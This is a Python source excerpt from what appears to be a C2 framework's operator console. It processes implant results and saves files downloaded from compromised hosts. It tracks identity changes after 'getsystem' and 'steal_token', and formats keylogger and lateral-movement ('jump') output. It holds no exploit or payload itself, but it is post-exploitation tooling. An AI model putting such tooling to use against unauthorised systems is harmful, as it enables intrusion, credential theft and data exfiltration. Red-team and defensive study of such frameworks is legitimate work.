        marker = "[*]" if task.status.name == "COMPLETE" else "[!]"
        if not (task.result and task.result.raw):
            _print(f"\n{marker} Result from {session.hostname} ({task.module_name}): (no output)")
            return

        # Update prompt immediately for impersonation changes
        if task.status.name == "COMPLETE":
            text_preview = task.result.raw.decode("utf-8", errors="replace")
            if task.module_name == "getsystem" and "SUCCESS" in text_preview:
                # Save original identity so rev2self can restore it
                if not hasattr(session, "_original_username"):
                    session._original_username = session.username
                    session._original_integrity = session.integrity
                session.username = "NT AUTHORITY\\SYSTEM"
                session.integrity = "SYSTEM"
                self._invalidate_prompt()
            elif task.module_name == "steal_token" and "Successfully stole" in text_preview:
                # Save original identity so rev2self can restore it
                if not hasattr(session, "_original_username"):
                    session._original_username = session.username
                    session._original_integrity = session.integrity
                # Parse stolen identity from output: "Impersonating: DOMAIN\user"
                m = re.search(r"Impersonating:\s*(.+)", text_preview)
                if m:
                    session.username = m.group(1).strip()
                self._invalidate_prompt()
            elif task.module_name == "rev2self" and "Reverted" in text_preview:
                if hasattr(session, "_original_username"):
                    session.username = session._original_username
                    session.integrity = session._original_integrity
                    del session._original_username
                    del session._original_integrity
                self._invalidate_prompt()

        # Handle cd specially — update agent CWD from result
        if task.module_name == "cd" and task.status.name == "COMPLETE":
            text = task.result.raw.decode("utf-8", errors="replace").strip()
            # Merlin format: "Changed working directory to <path>"
            prefix = "Changed working directory to "
            if text.startswith(prefix):
                session.cwd = text[len(prefix):]
                self._completer.remote_entries = []  # stale after cd
            elif text.startswith("Current working directory: "):
                session.cwd = text[len("Current working directory: "):]
            elif not text.startswith("there was an error"):
                session.cwd = text
                self._completer.remote_entries = []
            _print(f"\n  {text}")
            return

        # Handle ls — cache entries for tab completion
        if task.module_name == "ls" and task.status.name == "COMPLETE":
            text = task.result.raw.decode("utf-8", errors="replace").strip()
            entries = []
            for line in text.splitlines():
                if line.startswith("Directory listing for:") or not line.strip():
                    continue
                parts = line.split("\t")
                if len(parts) >= 4:
                    name = parts[3]
                    is_dir = parts[0].startswith("d")
                    entries.append((name, is_dir))
            self._completer.remote_entries = entries

        # Handle download — save file to disk
        if task.module_name == "download" and task.status.name == "COMPLETE":
            data = task.result.raw
            if not data:
                _print(f"\n[!] Download failed: empty response")
                return
            remote_path = getattr(task, "_download_remote", "unknown")
            local_override = getattr(task, "_download_local", "")
            if local_override:
                save_path = Path(local_override)
            else:
                dl_dir = Path("downloads")
                dl_dir.mkdir(exist_ok=True)
                filename = remote_path.replace("\\", "/").rsplit("/", 1)[-1] or "download"
                save_path = dl_dir / f"{session.hostname}_{filename}"
            save_path.parent.mkdir(parents=True, exist_ok=True)
            save_path.write_bytes(data)
            size_kb = len(data) / 1024
            _print(f"\n{marker} Downloaded {remote_path} from {session.hostname}")
            _print(f"    Saved: {save_path.resolve()} ({size_kb:.1f} KB)")
            return

        _print(f"\n{marker} Result from {session.hostname} ({task.module_name}):")
        mod = self.module_registry.get(task.module_name)
        if mod:
            try:
                output = self.output_parser.parse(mod, task.result.raw)
                if output.error:
                    _print(f"[!] Error: {output.error}")
                elif output.raw_rows:
                    _print_table(mod.columns, output.raw_rows)
                elif output.text:
                    _print(output.text)
                elif output.file_data:
                    nbytes = len(output.file_data)
                    _print(f"[*] File data received: {nbytes} bytes")
                else:
                    # Parser returned empty — show raw
                    _print(task.result.raw.decode("utf-8", errors="replace"))
            except (ValueError, Exception):
                # Parse failed (e.g. plain-text diagnostics, not TLV) — show raw
                _print(task.result.raw.decode("utf-8", errors="replace"))
        else:
            text = task.result.raw.decode("utf-8", errors="replace")
            display_cmd = getattr(task, '_display_cmd', task.module_name)
            formatter = _NATIVE_FORMATTERS.get(display_cmd)
            if formatter:
                formatter(text)
            else:
                _print(text)


# ─── Plain-text output helpers (bypass Rich to avoid ANSI corruption) ──


def _print(text: str):
    """Write plain text to stderr (avoids prompt_toolkit's patch_stdout)."""
    import sys
    sys.stderr.write(text + "\n")
    sys.stderr.flush()


def _print_table(columns: list, rows: list):
    """Render a plain-text aligned table to stderr."""
    if not rows:
        _print("  (no data)")
        return
    # Calculate column widths
    widths = {col: len(col) for col in columns}
    for row in rows:
        for col in columns:
            val = str(row.get(col, ""))
            widths[col] = max(widths[col], len(val))
    # Header
    header = "  ".join(col.upper().ljust(widths[col]) for col in columns)
    _print(f"  {header}")
    _print(f"  {'  '.join('─' * widths[col] for col in columns)}")
    # Rows
    for row in rows:
        line = "  ".join(str(row.get(col, "")).ljust(widths[col]) for col in columns)
        _print(f"  {line}")


def _fmt_systeminfo(text: str):
    """Print systeminfo output — key: value pairs, one per line."""
    _print("")
    for line in text.strip().splitlines():
        _print(f"  {line}")
    _print("")


def _fmt_whoami(text: str):
    """Print whoami output as-is — the agent already formats it like whoami /all."""
    _print("")
    for line in text.splitlines():
        _print(f"  {line}")
    _print("")


def _fmt_ps(text: str):
    """Format ps as clean aligned text."""
    lines = text.strip().splitlines()
    if not lines:
        _print("  No processes returned.")
        return
    _print("")
    _print(f"  {'PID':>6}  {'PPID':>6}  {'SID':>4}  Name")
    _print(f"  {'------':>6}  {'------':>6}  {'----':>4}  {'----'}")
    for line in lines:
        if line.startswith("PID") or line.startswith("──"):
            continue
        fields = line.split(None, 3)
        if len(fields) >= 4:
            _print(f"  {fields[0]:>6}  {fields[1]:>6}  {fields[2]:>4}  {fields[3]}")
        elif fields:
            _print(f"  {'':>6}  {'':>6}  {'':>4}  {fields[0]}")
    _print("")


def _fmt_ls(text: str):
    """Format ls output — Merlin-style: perms, modified, size, name."""
    lines = text.strip().splitlines()
    if not lines:
        _print("  Empty directory.")
        return
    _print("")
    for line in lines:
        # Header line: "Directory listing for: ..."
        if line.startswith("Directory listing for:"):
            _print(f"  {line}")
            continue
        # Blank lines
        if not line.strip():
            continue
        # Data rows: perms\tmodified\tsize\tname
        parts = line.split("\t")
        if len(parts) >= 4:
            perms, modified, size, name = parts[0], parts[1], parts[2], parts[3]
            _print(f"  {perms:<10}  {modified:<19}  {size:>10}  {name}")
        else:
            _print(f"  {line}")
    _print("")


def _fmt_dir(text: str):
    """Format ls output as Windows CMD dir style."""
    lines = text.strip().splitlines()
    if not lines:
        _print("  Empty directory.")
        return

    dir_path = ""
    file_count = 0
    dir_count = 0
    total_bytes = 0

    _print("")
    for line in lines:
        if line.startswith("Directory listing for:"):
            dir_path = line[len("Directory listing for:"):].strip()
            _print(f" Directory of {dir_path}")
            _print("")
            continue
        if not line.strip():
            continue
        parts = line.split("\t")
        if len(parts) >= 4:
            perms, modified, size_str, name = parts[0], parts[1], parts[2], parts[3]
            is_dir = perms.startswith("d")
            # Convert modified "2025-07-15 10:30:45" → "07/15/2025  10:30 AM"
            dt_display = modified
            try:
                from datetime import datetime as _dt
                dt = _dt.strptime(modified, "%Y-%m-%d %H:%M:%S")
                dt_display = dt.strftime("%m/%d/%Y  %I:%M %p")
            except Exception:
                pass
            if is_dir:
                dir_count += 1
                _print(f"{dt_display}    <DIR>          {name}")
            else:
                file_count += 1
                try:
                    sz = int(size_str)
                except ValueError:
                    sz = 0
                total_bytes += sz
                _print(f"{dt_display}    {sz:>14,} {name}")
        else:
            _print(f"  {line}")

    _print(f"               {file_count} File(s)  {total_bytes:>14,} bytes")
    _print(f"               {dir_count} Dir(s)")
    _print("")


def _fmt_keylogger(text: str):
    """Print keylogger output."""
    _print("")
    for line in text.strip().splitlines():
        _print(f"  {line}")
    _print("")


def _fmt_jump(text: str):
    """Print jump (lateral movement) output."""
    _print("")
    for line in text.strip().splitlines():
        _print(f"  {line}")
    _print("")


_NATIVE_FORMATTERS = {
    "systeminfo": _fmt_systeminfo,
    "whoami": _fmt_whoami,
    "ps": _fmt_ps,
    "ls": _fmt_ls,
    "dir": _fmt_dir,
    "keylogger": _fmt_keylogger,
    "jump": _fmt_jump,
    "link": _fmt_jump,
    "unlink": _fmt_jump,
    "spawnto": _fmt_jump,
    "ppid": _fmt_jump,
    "spawn": _fmt_jump,
}
